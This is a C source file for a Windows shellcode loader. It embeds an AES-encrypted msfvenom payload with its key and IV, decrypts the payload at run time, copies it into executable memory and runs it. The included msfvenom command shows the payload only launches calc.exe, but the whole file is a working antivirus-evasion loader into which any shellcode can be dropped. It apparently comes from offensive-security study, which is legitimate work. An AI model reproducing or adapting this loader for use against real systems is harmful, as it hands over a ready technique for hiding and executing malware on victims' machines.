/*

Compiled with mingw (sudo apt install gcc-mingw-w64)

x86_64-w64-mingw32-gcc msf_encoded.c lib/aes.c -o encoded.exe

*/

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#define CBC 1

#include "./lib/aes.h"
#include "./lib/pkcs7_padding.c"

// KEY=cWdFQWNjUQKaStJfKGjhZyiblLTxltAl IV=yjXGyQzUWGmrsbhY
// msfvenom -p windows/x64/exec CMD="calc.exe" -f c --encrypt aes256 --encrypt-key $KEY --encrypt-iv $IV -o aes.txt
unsigned char buf[] = 
"\x2c\x0a\xcd\xb4\x1f\x2c\x8d\xbb\xb6\x39\x56\xf2\xc9\xe6"
"\x7f\x1a\x26\xab\x81\x01\x8d\xf1\xaf\xff\x1d\xd0\x11\x70"
"\x60\x1a\xcd\xdf\xe6\x54\xec\xc7\xd7\xcf\x3e\xdb\x63\xba"
"\x4c\x9a\x94\xc3\x09\x67\xac\x46\x46\x79\x4b\xc9\xde\xa8"
"\x29\x5d\x6f\x85\x38\x71\x95\x2b\xd3\x16\xfc\xa2\x7e\x5a"
"\x1d\x7b\x40\x9d\xf9\xee\x97\x46\x63\x7a\xe4\x5d\x18\x50"
"\x65\x90\xd5\x86\xac\xb0\x8a\xba\x65\x1c\x30\x26\xc0\xf5"
"\x5b\x25\xc1\xe6\x64\x8f\x01\x26\x86\xe4\x64\x73\xe5\xc4"
"\x11\x92\xe6\xca\xa9\xe1\x76\x73\x18\xe5\x07\xb3\x00\x5c"
"\xe0\x8c\xf4\x47\x87\x93\x42\x93\x6b\xdb\x1b\xdf\x60\xee"
"\xad\x62\x4a\xc3\xda\x8d\x43\x88\xe9\x03\x03\x0d\xae\x6d"
"\x99\xc9\x67\x36\xe9\xcd\xfc\xb7\x22\xfa\xc4\x8d\x88\x30"
"\x75\x0a\x33\x12\x8f\x36\xa0\xcc\x4d\x3b\x3c\x79\xb0\x31"
"\xc5\xd3\x5c\xd1\xe7\x39\x16\x20\xc2\xd3\xc0\x50\xc4\x06"
"\x92\xf5\x51\xb7\xa5\x9d\xee\x75\x54\xae\x95\xb0\xc2\x6c"
"\x17\x6a\xba\x0d\x30\x53\x8d\xf8\x4d\x27\xd3\x6f\xf6\xc1"
"\x86\x63\xc8\xaf\x43\x9a\x80\x90\xc0\x0d\xa6\x9b\xe4\xf0"
"\x7e\x67\x96\x11\xaa\x56\xee\x92\x0b\xcc\xdb\xba\x29\x05"
"\x8b\xc4\x53\xe5\xa1\xbf\xe2\x80\xc2\x5e\xdb\xf8\xd6\xfd"
"\x04\xd8\x92\x91\xc3\x71\x63\x8f\x4a\x46\xe0\x81\xf0\xdd"
"\xc9\x18\x65\x54\x7f\x6b\x35\xe8";

int main(){

    int buflen = sizeof(buf);
    int bufPadd = buflen;

    // make length multiple of 16 bytes
    if(buflen % 16){ 
        bufPadd += 16 - (buflen % 16);
    }
    printf("Original buffer length: %d, padded buffer length: %d\n", buflen, bufPadd);

    // fill in array + pad with zeros 
    char shellcodearray[bufPadd];
    memset(shellcodearray, 0, bufPadd);

    for (int i = 0 ; i < buflen ; i++){
        shellcodearray[i] = (unsigned char)buf[i];
    }

    printf("Encrypted ciphertext:\n");
    for (int i = 0 ; i < sizeof(shellcodearray) ; i++){
        printf("\\x%02x", (unsigned char)shellcodearray[i]);
    }

    int shellPad = pkcs7_padding_pad_buffer(shellcodearray, buflen, sizeof(shellcodearray), 16) ;

    printf("\nPadded ciphertext: ");
    for (int i = 0 ; i < sizeof(buflen); i++){
        printf("%02x", shellcodearray[i]);
    }

    // validate size
    int valid = pkcs7_padding_valid( shellcodearray, buflen, sizeof(shellcodearray), 16 );
    printf("\nValid: %d\n\n", valid);

    // Hex versions of Key and IV values
    uint8_t key[] = {0x63, 0x57, 0x64, 0x46, 0x51, 0x57, 0x4e, 0x6a, 0x55, 0x51, 0x4b, 0x61, 0x53, 0x74, 0x4a, 0x66, 0x4b, 0x47, 0x6a, 0x68, 0x5a, 0x79, 0x69, 0x62, 0x6c, 0x4c, 0x54, 0x78, 0x6c, 0x74, 0x41, 0x6c};
    uint8_t iv[]  = {0x79, 0x6a, 0x58, 0x47, 0x79, 0x51, 0x7a, 0x55, 0x57, 0x47, 0x6d, 0x72, 0x73, 0x62, 0x68, 0x59};

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcodearray, sizeof(shellcodearray) - 1);

    printf("Decrypted ciphertext:\n");
    for (int i = 0 ; i < sizeof(shellcodearray) ; i++){
        printf("\\x%02x", (unsigned char)shellcodearray[i]);
    }

    // Pops calc.exe
    void *exec = VirtualAlloc(0, sizeof shellcodearray, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodearray, sizeof shellcodearray);
    ((void(*)())exec)();

    return 0;
}
